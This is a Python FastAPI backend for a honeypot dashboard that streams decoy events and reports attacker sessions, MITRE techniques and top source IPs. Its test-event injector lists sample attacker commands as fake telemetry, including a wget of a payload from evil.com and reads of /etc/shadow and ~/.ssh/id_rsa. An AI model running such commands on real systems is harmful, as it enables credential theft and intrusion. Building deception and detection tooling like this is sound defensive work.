"""
CI/CDecoy Dashboard — Minimal MVP Backend
FastAPI + SSE (from NATS) + REST (from TimescaleDB)

Aligned to: cti/storage/schema.sql
Tables: decoy_events, decoy_sessions, honeytoken_triggers
Views:  decoy_events_hourly, mitre_technique_daily
"""

import asyncio
import json
import os
import time
import uuid
import random
from contextlib import asynccontextmanager
from datetime import datetime, timezone, timedelta
from typing import AsyncGenerator

import asyncpg
import nats
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from sse_starlette.sse import EventSourceResponse

# ── Config ──────────────────────────────────────────
NATS_URL = os.getenv("NATS_URL", "nats://localhost:4222")
DB_DSN = os.getenv("DB_DSN", "postgresql://cicdecoy:cicdecoy@localhost:5432/cicdecoy")
NATS_SUBJECTS = os.getenv("NATS_SUBJECTS", "cicdecoy.>")

# ── Global state ────────────────────────────────────
nc = None
db_pool = None
event_buffer: list[dict] = []
MAX_BUFFER = 500
subscribers: list[asyncio.Queue] = []


async def nats_handler(msg):
    try:
        payload = json.loads(msg.data.decode())
    except (json.JSONDecodeError, UnicodeDecodeError):
        payload = {"raw": msg.data.decode(errors="replace")}

    event = {
        "subject": msg.subject,
        "ts": datetime.now(timezone.utc).isoformat(),
        "payload": payload,
    }

    event_buffer.append(event)
    if len(event_buffer) > MAX_BUFFER:
        event_buffer.pop(0)

    dead = []
    for q in subscribers:
        try:
            q.put_nowait(event)
        except asyncio.QueueFull:
            dead.append(q)
    for q in dead:
        subscribers.remove(q)


@asynccontextmanager
async def lifespan(app: FastAPI):
    global nc, db_pool

    try:
        db_pool = await asyncpg.create_pool(DB_DSN, min_size=2, max_size=10, timeout=10)
        async with db_pool.acquire() as conn:
            v = await conn.fetchval("SELECT version()")
            print(f"[db] Connected — {v[:60]}")
    except Exception as e:
        print(f"[db] WARNING — running without DB: {e}")
        db_pool = None

    try:
        nc = await nats.connect(NATS_URL)
        await nc.subscribe(NATS_SUBJECTS, cb=nats_handler)
        print(f"[nats] Subscribed to {NATS_SUBJECTS}")
    except Exception as e:
        print(f"[nats] WARNING — running without NATS: {e}")
        nc = None

    yield

    if nc and nc.is_connected:
        await nc.drain()
    if db_pool:
        await db_pool.close()


app = FastAPI(title="CI/CDecoy Dashboard", lifespan=lifespan)
app.mount("/static", StaticFiles(directory="static"), name="static")


# ── SSE: Live event stream ──────────────────────────
@app.get("/api/events/stream")
async def event_stream(request: Request):
    q: asyncio.Queue = asyncio.Queue(maxsize=100)
    subscribers.append(q)

    async def generate() -> AsyncGenerator[dict, None]:
        for ev in event_buffer[-50:]:
            yield {"event": "decoy_event", "data": json.dumps(ev)}
        try:
            while True:
                if await request.is_disconnected():
                    break
                try:
                    ev = await asyncio.wait_for(q.get(), timeout=15.0)
                    yield {"event": "decoy_event", "data": json.dumps(ev)}
                except asyncio.TimeoutError:
                    yield {"event": "ping", "data": "keepalive"}
        finally:
            if q in subscribers:
                subscribers.remove(q)

    return EventSourceResponse(generate())


# ── REST: Sessions ──────────────────────────────────
@app.get("/api/sessions")
async def get_sessions(limit: int = 50):
    if not db_pool:
        return JSONResponse({"sessions": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT session_id, decoy_name, decoy_tier, source_ip::TEXT,
                   start_time, end_time, duration_seconds,
                   auth_username, auth_method, auth_attempts,
                   command_count, unique_commands, commands,
                   mitre_techniques, tools_detected, max_severity,
                   attack_phases, kill_chain_detected, geo,
                   honeytokens_accessed, updated_at
            FROM decoy_sessions
            ORDER BY start_time DESC
            LIMIT $1
        """, limit)

    return {"sessions": [_serialize_session(r) for r in rows]}


def _serialize_session(r):
    def _json(val):
        if val is None:
            return []
        return json.loads(val) if isinstance(val, str) else val

    return {
        "session_id": r["session_id"],
        "decoy_name": r["decoy_name"],
        "decoy_tier": r["decoy_tier"],
        "source_ip": r["source_ip"],
        "start_time": r["start_time"].isoformat() if r["start_time"] else None,
        "end_time": r["end_time"].isoformat() if r["end_time"] else None,
        "duration_seconds": r["duration_seconds"],
        "auth_username": r["auth_username"],
        "auth_attempts": r["auth_attempts"],
        "command_count": r["command_count"],
        "unique_commands": r["unique_commands"],
        "commands": _json(r["commands"]),
        "mitre_techniques": _json(r["mitre_techniques"]),
        "tools_detected": _json(r["tools_detected"]),
        "max_severity": r["max_severity"],
        "attack_phases": _json(r["attack_phases"]),
        "kill_chain_detected": r["kill_chain_detected"],
        "geo": json.loads(r["geo"]) if isinstance(r["geo"], str) else (r["geo"] or {}),
        "honeytokens_accessed": _json(r["honeytokens_accessed"]),
    }


# ── REST: MITRE technique heatmap ───────────────────
@app.get("/api/mitre")
async def get_mitre_summary():
    if not db_pool:
        return JSONResponse({"techniques": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        try:
            rows = await conn.fetch("""
                SELECT technique_id,
                       SUM(observation_count)::INT AS total,
                       SUM(unique_actors)::INT AS actors,
                       SUM(decoys_affected)::INT AS decoys
                FROM mitre_technique_daily
                WHERE bucket > NOW() - INTERVAL '7 days'
                GROUP BY technique_id
                ORDER BY total DESC LIMIT 30
            """)
        except Exception:
            rows = await conn.fetch("""
                SELECT t->>'technique_id' AS technique_id,
                       COUNT(*)::INT AS total,
                       COUNT(DISTINCT source_ip)::INT AS actors,
                       COUNT(DISTINCT decoy_name)::INT AS decoys
                FROM decoy_events,
                     jsonb_array_elements(mitre_techniques) AS t
                WHERE timestamp > NOW() - INTERVAL '7 days'
                  AND jsonb_array_length(mitre_techniques) > 0
                GROUP BY technique_id
                ORDER BY total DESC LIMIT 30
            """)

    return {"techniques": [dict(r) for r in rows]}


# ── REST: Engage effectiveness ──────────────────────
@app.get("/api/engage")
async def get_engage_summary():
    if not db_pool:
        return JSONResponse({"engage": [], "error": "DB not connected"})

    ENGAGE_MAP = {
        "discovery": "EAC0004 — Pocket Litter",
        "credential-access": "EAC0005 — Lure",
        "lateral-movement": "EAC0014 — Network Manipulation",
        "collection": "EAC0005 — Lure",
        "execution": "EAC0006 — Behavioral Analytics",
        "persistence": "EAC0021 — Monitoring",
        "exfiltration": "EAC0003 — Burn Notice",
    }

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            WITH tech AS (
                SELECT t->>'technique_id' AS tid,
                       t->>'technique_name' AS tname,
                       t->>'tactic' AS tactic,
                       s.session_id, s.kill_chain_detected,
                       s.command_count, s.duration_seconds
                FROM decoy_sessions s,
                     jsonb_array_elements(s.mitre_techniques) AS t
            )
            SELECT tid, COALESCE(tname, tid) AS tname, tactic,
                   COUNT(*)::INT AS times_observed,
                   COUNT(DISTINCT session_id)::INT AS sessions,
                   SUM(CASE WHEN kill_chain_detected THEN 1 ELSE 0 END)::INT AS kill_chains,
                   ROUND(AVG(command_count))::INT AS avg_cmds,
                   ROUND(AVG(COALESCE(duration_seconds,0)))::INT AS avg_dur
            FROM tech WHERE tid IS NOT NULL
            GROUP BY tid, tname, tactic
            ORDER BY times_observed DESC LIMIT 50
        """)

    engage = []
    for r in rows:
        tactic = r["tactic"] or "unknown"
        dur = r["avg_dur"] or 0
        cmds = r["avg_cmds"] or 0
        eff = min(1.0, dur / 300 * 0.5 + cmds / 20 * 0.5)
        engage.append({
            "technique_id": r["tid"],
            "technique_name": r["tname"],
            "tactic": tactic,
            "engage_activity": ENGAGE_MAP.get(tactic, "EAC0021 — Monitoring"),
            "times_observed": r["times_observed"],
            "sessions": r["sessions"],
            "kill_chains": r["kill_chains"],
            "avg_commands": cmds,
            "avg_duration_sec": dur,
            "effectiveness": round(eff, 2),
        })
    return {"engage": engage}


# ── REST: Stats ─────────────────────────────────────
@app.get("/api/stats")
async def get_stats():
    base = {
        "total_sessions": 0, "active_sessions": 0,
        "total_events": len(event_buffer), "unique_ips": 0,
        "high_sev_24h": 0, "honeytokens_triggered": 0,
        "kill_chains": 0,
        "db_connected": db_pool is not None,
        "nats_connected": nc is not None and nc.is_connected,
    }
    if not db_pool:
        return JSONResponse(base)

    async with db_pool.acquire() as conn:
        s = await conn.fetchrow("""
            SELECT
                (SELECT COUNT(*) FROM decoy_sessions) AS total_sessions,
                (SELECT COUNT(*) FROM decoy_sessions WHERE end_time IS NULL) AS active,
                (SELECT COUNT(*) FROM decoy_events WHERE timestamp > NOW() - INTERVAL '24h') AS ev24,
                (SELECT COUNT(DISTINCT source_ip) FROM decoy_sessions) AS ips,
                (SELECT COUNT(*) FROM decoy_events
                 WHERE timestamp > NOW() - INTERVAL '24h'
                   AND severity IN ('high','critical')) AS high24,
                (SELECT COUNT(*) FROM honeytoken_triggers) AS ht,
                (SELECT COUNT(*) FROM decoy_sessions WHERE kill_chain_detected) AS kc
        """)
    return {
        "total_sessions": s["total_sessions"], "active_sessions": s["active"],
        "total_events": s["ev24"], "unique_ips": s["ips"],
        "high_sev_24h": s["high24"], "honeytokens_triggered": s["ht"],
        "kill_chains": s["kc"],
        "db_connected": True,
        "nats_connected": nc is not None and nc.is_connected,
    }


# ── REST: Top IPs ──────────────────────────────────
@app.get("/api/top-ips")
async def get_top_ips(hours: int = 24, limit: int = 15):
    if not db_pool:
        return JSONResponse({"ips": []})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT source_ip::TEXT, COUNT(*) AS events,
                   MAX(severity) AS max_severity,
                   COUNT(DISTINCT session_id) AS sessions
            FROM decoy_events
            WHERE timestamp > NOW() - make_interval(hours => $1)
            GROUP BY source_ip ORDER BY events DESC LIMIT $2
        """, hours, limit)
    return {"ips": [dict(r) for r in rows]}


# ── DEV: Inject test event ─────────────────────────
SAMPLE_TECHNIQUES = [
    {"technique_id": "T1059.004", "technique_name": "Unix Shell", "tactic": "execution"},
    {"technique_id": "T1003.008", "technique_name": "/etc/passwd and /etc/shadow", "tactic": "credential-access"},
    {"technique_id": "T1082", "technique_name": "System Information Discovery", "tactic": "discovery"},
    {"technique_id": "T1021.004", "technique_name": "SSH Lateral Movement", "tactic": "lateral-movement"},
    {"technique_id": "T1083", "technique_name": "File and Directory Discovery", "tactic": "discovery"},
    {"technique_id": "T1046", "technique_name": "Network Service Discovery", "tactic": "discovery"},
    {"technique_id": "T1560", "technique_name": "Archive Collected Data", "tactic": "collection"},
]

SAMPLE_COMMANDS = [
    "cat /etc/shadow", "whoami", "uname -a", "id", "ls -la /root",
    "wget http://evil.com/payload.sh", "curl ifconfig.me",
    "netstat -tlnp", "find / -name '*.pem'", "ssh root@10.0.0.5",
    "tar czf /tmp/data.tar.gz /etc", "cat /etc/passwd",
    "ps aux", "history", "cat ~/.ssh/id_rsa",
]


@app.post("/api/test/inject")
async def inject_test_event():
    now = datetime.now(timezone.utc)
    tech = random.choice(SAMPLE_TECHNIQUES)
    cmd = random.choice(SAMPLE_COMMANDS)
    src_ip = f"{random.choice([198,203,45,91,185])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    sev = random.choices(["info","low","medium","high","critical"], weights=[10,25,35,20,10])[0]

    fake = {
        "event_id": f"evt-{uuid.uuid4().hex[:12]}",
        "timestamp": now.isoformat(),
        "decoy_name": random.choice(["ssh-decoy-01", "ssh-decoy-02", "ssh-tier3-01"]),
        "decoy_tier": random.choice([2, 3]),
        "session_id": f"sess-{uuid.uuid4().hex[:12]}",
        "event_type": "command",
        "source_ip": src_ip,
        "source_port": random.randint(30000, 65000),
        "geo": {"country": random.choice(["CN","RU","IR","KP","BR","US"]), "city": "Unknown"},
        "mitre_techniques": [tech],
        "tool_signatures": [],
        "severity": sev,
        "tags": ["test"],
        "raw_data": {"command": cmd, "output_lines": random.randint(0, 50)},
    }

    subject = f"cicdecoy.decoy.events.{fake['event_type']}"

    if nc and nc.is_connected:
        await nc.publish(subject, json.dumps(fake).encode())
        return {"status": "published_to_nats", "event_id": fake["event_id"]}
    else:
        event = {"subject": subject, "ts": now.isoformat(), "payload": fake}
        event_buffer.append(event)
        for q in subscribers:
            try:
                q.put_nowait(event)
            except asyncio.QueueFull:
                pass
        return {"status": "local_only", "event_id": fake["event_id"]}


@app.get("/", response_class=HTMLResponse)
async def index():
    with open("static/index.html") as f:
        return f.read()